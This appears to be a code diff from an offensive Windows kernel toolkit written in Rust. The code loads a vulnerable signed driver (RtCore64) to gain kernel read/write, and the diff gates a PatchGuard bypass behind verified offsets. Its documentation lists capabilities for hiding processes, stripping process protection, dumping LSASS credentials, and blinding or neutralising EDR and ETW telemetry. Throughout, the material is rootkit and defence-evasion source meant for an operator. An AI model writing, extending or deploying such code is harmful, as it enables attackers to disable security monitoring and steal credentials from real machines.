@@ -40,7 +40,7 @@ pub mod va_rw;
 
 use crate::byovd::{ByovdDriver, RtCore64, VulnDriverIoctl};
 use crate::etwti::{EtwTiBlind, EtwTiOffsets};
-use crate::{EtwTiKit, KernelRw, KernelTier, KitError, PatchGuardKit};
+use crate::{DriverHandle, EtwTiKit, KernelRw, KernelTier, KitError, PatchGuardKit};
 use alloc::boxed::Box;
 use alloc::format;
 
@@ -434,6 +434,16 @@ pub fn read_current_prcb_kva() -> usize {
 /// is driven entirely by runtime data — the PG context offsets table and the
 /// `supports_thread_suspend` flag — with no hardcoded build check.
 ///
+/// ⚠ **EXPERIMENTAL / GATED OFF (kernelsdk-1-1):** every row in
+/// `KNOWN_PG_CONTEXT_BUILDS` currently carries PLACEHOLDER offsets (0x190/0x08
+/// guessed from KPCR layouts, never verified against a live kernel or PDB).
+/// This function therefore returns `None` for EVERY build until a row is
+/// flipped to `verified` (see [`crate::offsets::pg_context_usable_for_window`]
+/// and [`crate::offsets::PgContextOffsets::verified`]). The bypass code paths
+/// remain in place and become reachable per-build as PDB validation lands — a
+/// window built from placeholder offsets is a bugcheck lottery, so the
+/// capability is deliberately OFF rather than silently wrong.
+///
 /// Returns a `Box<dyn PatchGuardKit>` or `None` if no PG bypass is available
 /// for this build. The box owns the window; its `enter_unchecked` borrows the
 /// `KernelRw` for the duration of the unchecked window only (via `PgGuard`).
@@ -449,6 +459,14 @@ pub fn select_pg_window(
     krw: &'_ dyn KernelRw,
 ) -> Option<alloc::boxed::Box<dyn PatchGuardKit + '_>> {
     use crate::offsets::pg_context_for_build;
+
+    // kernelsdk-1-1 gate: placeholder (unverified) PG-context rows must not
+    // yield a window — building one from guessed offsets would write to a
+    // wrong kernel address and bugcheck. The capability stays OFF until a row
+    // is verified.
+    if !crate::offsets::pg_context_usable_for_window(build) {
+        return None;
+    }
 
     let pg = pg_context_for_build(build)?;
     let prcb_kva = read_current_prcb_kva();
@@ -482,7 +500,10 @@ pub fn select_pg_window(
 /// - **Process hide** — `ProcessHider` (needs `ps_active_process_head_kva` + EPROCESS offsets)
 /// - **PPL strip/immortal** — `PplStripper` (same as ProcessHider)
 /// - **LSASS dump** — `KernelLsassReader` (needs `ps_active_process_head_kva` + EPROCESS offsets)
-/// - **WFP silencer** — `UserModeEdrSilencer` (zero-field, always wired)
+/// - **WFP silencer** — `UserModeEdrSilencer` — NOT wired: the WFP path
+///   (`block_outbound_for_pid`) always returns `Err` until PID→image-path
+///   resolution (FWPM_CONDITION_ALE_APP_ID) is implemented, so `tier.wfp` is
+///   always `None` and the tier honestly reports wfp=false.
 /// - **EDR neutralize** — `EdrNeutralizer` (Freeze/Choke user-mode FFI; Kill via separate call)
 ///
 /// PatchGuard windows are NOT in the tier (they borrow `&dyn KernelRw` for their
@@ -490,8 +511,8 @@ pub fn select_pg_window(
 ///
 /// After this call, `tier.rw.kread()` / `tier.rw.kwrite()` are LIVE — the real
 /// kernel primitive (KslD or BYOVD) is owned by the tier. The BYOVD `LoadedDriver`
-/// is stored in `tier.loaded_driver` for explicit `unload()` when the operator
-/// is done.
+/// is stored in `tier.loaded_driver` for explicit [`KernelTier::unload_driver`]
+/// when the operator is done.
 ///
 /// Kits whose required offsets are unresolved (KVA == 0) are left as `None` and
 /// degrade cleanly — the operator can check `tier.minifilter.is_some()` etc.
@@ -507,12 +528,13 @@ pub fn assemble_tier(
     _build: u32,
 ) -> KernelTier {
     // Destructure the bootstrap to extract the live KernelRw + optional driver.
-    let (krw, loaded_driver): (Box<dyn KernelRw>, Option<Box<dyn Send + Sync>>) = match bootstrap {
+    let (krw, loaded_driver): (Box<dyn KernelRw>, Option<Box<dyn DriverHandle>>) = match bootstrap {
         KernelBootstrap::KslD(defender) => (Box::new(defender), None),
         KernelBootstrap::Byovd(loaded, driver) => {
             // Both `loaded` (LoadedDriver) and `driver` (ByovdDriver) are
-            // Send+Sync. Store the LoadedDriver for explicit unload; move the
-            // ByovdDriver (which IS the KernelRw) into the tier.
+            // Send+Sync. Store the LoadedDriver for explicit unload via
+            // KernelTier::unload_driver(); move the ByovdDriver (which IS the
+            // KernelRw) into the tier.
             (Box::new(driver), Some(Box::new(loaded)))
         }
     };
